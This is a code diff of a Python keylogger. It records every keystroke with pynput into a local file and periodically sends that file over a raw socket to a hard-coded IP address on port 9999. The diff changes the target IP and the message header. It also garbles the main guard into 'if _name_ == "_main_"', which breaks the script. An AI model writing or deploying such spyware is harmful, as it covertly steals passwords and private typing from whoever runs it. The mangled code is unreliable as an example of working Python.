@@ -2,7 +2,7 @@ from pynput import keyboard
 from threading import Timer
 import socket
 
-ip = "192.168.1.18"
+ip = "192.168.1.72"
 list = []
 
 def get_key_name(key):
@@ -19,7 +19,7 @@ def on_press(key):
           f.write(ele)
     f.close()
 #    print("Key {} pressed".format(key_name))
-#    print("Key type: {}".format(key.__class__.__name__))
+#    print("Key type: {}".format(key._class.name_))
 
 
 def timer():
@@ -38,7 +38,7 @@ def sendFile():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect((ip, 9999))
 	with open('keyPressed.txt', 'rb') as file:
-		s.send("Get checker file".encode('ascii'))
+		s.send("keypress".encode('ascii'))
 		l = file.read(1024)
 		while (l):
 			s.send(l)
@@ -49,7 +49,7 @@ def sendFile():
 	print("Le fichier a été correctement copié et effacer ")
 
 
-if __name__ == "__main__":
+if _name_ == "_main_":
     with keyboard.Listener(
         on_press = on_press) as listener:
         timer() 
